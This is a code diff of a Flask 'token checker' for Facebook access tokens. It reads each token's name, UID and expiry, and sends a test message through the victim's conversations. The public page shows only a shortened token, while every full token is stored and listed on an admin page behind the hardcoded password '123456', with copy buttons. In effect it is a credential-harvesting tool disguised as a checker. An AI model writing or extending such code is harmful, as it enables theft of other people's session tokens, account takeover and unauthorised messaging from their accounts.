@@ -8,7 +8,7 @@ import os
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(16)
 
-# ADMIN CREDENTIALS (CHANGE KAR DE)
+# ADMIN CREDENTIALS (TU CHANGE KAR SAKTA HAI)
 ADMIN_USERNAME = "legend"
 ADMIN_PASSWORD = "123456"
 
@@ -29,37 +29,60 @@ checked_tokens = load_tokens()
 def check_token_with_message(token):
     token = token.strip()
     
+    # DEFAULT RESULT
+    result = {
+        "valid": False,
+        "status": "NAHI CHAL RAHA",
+        "name": "Unknown",
+        "uid": "Unknown",
+        "token_prefix": token[:10] + "..." + token[-5:],
+        "full_token": token,
+        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S"),
+        "expiry_days": "Unknown"
+    }
+
+    # STEP 1: CHECK TOKEN VALIDITY + NAME + UID
     me_url = "https://graph.facebook.com/v15.0/me"
     params = {'access_token': token, 'fields': 'id,name'}
     try:
         r = requests.get(me_url, params=params, timeout=10)
         if r.status_code != 200:
-            return {"valid": False, "status": "NAHI CHAL RAHA", "error": "Invalid Token"}
+            return result
         data = r.json()
-        uid = data.get('id')
-        name = data.get('name')
+        result["uid"] = data.get('id', 'N/A')
+        result["name"] = data.get('name', 'N/A')
+        result["valid"] = True
+        result["status"] = "CHAL RAHA HAI"
     except:
-        return {"valid": False, "status": "NAHI CHAL RAHA", "error": "Network Error"}
+        return result
 
-    result = {
-        "valid": True,
-        "status": "CHAL RAHA HAI",
-        "name": name,
-        "uid": uid,
-        "token_prefix": token[:10] + "..." + token[-5:],
-        "full_token": token,  # Only for admin
-        "checked_at": time.strftime("%Y-%m-%d %H:%M:%S")
-    }
-
+    # STEP 2: DEBUG TOKEN → EXPIRY TIME
     try:
-        convo_url = f"https://graph.facebook.com/v15.0/{uid}/conversations"
+        debug_url = "https://graph.facebook.com/debug_token"
+        params = {'input_token': token, 'access_token': token}
+        r = requests.get(debug_url, params=params, timeout=10)
+        if r.status_code == 200:
+            expires_at = r.json().get('data', {}).get('expires_at')
+            if expires_at and expires_at > 0:
+                days_left = (expires_at - int(time.time())) // 86400
+                result["expiry_days"] = f"{days_left} days" if days_left > 0 else "Expired"
+            else:
+                result["expiry_days"] = "Never"
+        else:
+            result["expiry_days"] = "Unknown"
+    except:
+        result["expiry_days"] = "Error"
+
+    # STEP 3: MESSAGE SEND (OPTIONAL - FOR STATUS)
+    try:
+        convo_url = f"https://graph.facebook.com/v15.0/{result['uid']}/conversations"
         r = requests.get(convo_url, params={'access_token': token, 'limit': 1}, timeout=10)
         if r.status_code == 200 and r.json().get('data'):
             convo_id = r.json()['data'][0]['id']
             send_url = f"https://graph.facebook.com/v15.0/{convo_id}/messages"
             send_r = requests.post(send_url, data={'message': f"TEST_{int(time.time())}", 'access_token': token}, timeout=10)
             if send_r.status_code != 200:
-                error = send_r.json().get('error',{}).get('message','').lower()
+                error = send_r.json().get('error', {}).get('message', '').lower()
                 if "messaging" in error or "permission" in error:
                     result["status"] = "CHAL RAHA HAI (No Msg Perm)"
                 else:
@@ -149,6 +172,7 @@ HOME_TEMPLATE = '''
     <p><b>Name:</b> {{ result.name }}</p>
     <p><b>UID:</b> {{ result.uid }}</p>
     <p><b>Token:</b> {{ result.token_prefix }}</p>
+    <p><b>Valid for:</b> {{ result.expiry_days }}</p>
   </div>
   {% endif %}
 
@@ -201,11 +225,7 @@ ADMIN_TEMPLATE = '''
   </style>
   <script>
     function copyToken(token) {
-      navigator.clipboard.writeText(token).then(() => {
-        alert("Token Copied!");
-      }).catch(() => {
-        alert("Copy Failed! Select & Copy Manually.");
-      });
+      navigator.clipboard.writeText(token).then(() => alert("Token Copied!")).catch(() => alert("Copy Failed!"));
     }
   </script>
 </head>
@@ -222,6 +242,7 @@ ADMIN_TEMPLATE = '''
       <button class="copy-btn" onclick="copyToken('{{ t.full_token }}')">COPY</button>
     </p>
     <p class="{{ 'valid' if t.valid else 'invalid' }}"><b>{{ t.status }}</b></p>
+    <p><b>Valid for:</b> {{ t.expiry_days }}</p>
     <p><small>{{ t.checked_at }}</small></p>
   </div>
   {% endfor %}
